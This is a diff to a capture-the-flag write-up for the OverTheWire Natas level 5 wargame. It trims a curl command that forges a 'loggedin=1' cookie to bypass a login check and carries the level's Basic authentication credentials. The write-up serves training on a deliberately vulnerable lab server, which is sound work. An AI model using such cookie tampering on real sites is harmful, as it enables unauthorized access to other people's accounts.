@@ -61,7 +61,7 @@ Upon reload of the page, we now see this cookie is passed in our future REQUEST 
 server. Let's try changing it to `1`.
 
 ```
-curl 'http://natas5.natas.labs.overthewire.org/' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36' -H 'DNT: 1' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.9' -H 'Cookie: __cfduid=d773051550db82f7a8a4d2154d95cf23b1539528567; __utmc=176859643; __utmz=176859643.1540523077.10.2.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utma=176859643.380347011.1539528564.1540653662.1540658153.12; loggedin=1' --compressed
+$ curl 'http://natas5.natas.labs.overthewire.org/' -H 'Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx' -H 'Cookie: loggedin=1' --compressed
 <html>
 <head>
 <!-- This stuff in the header has nothing to do with the level -->
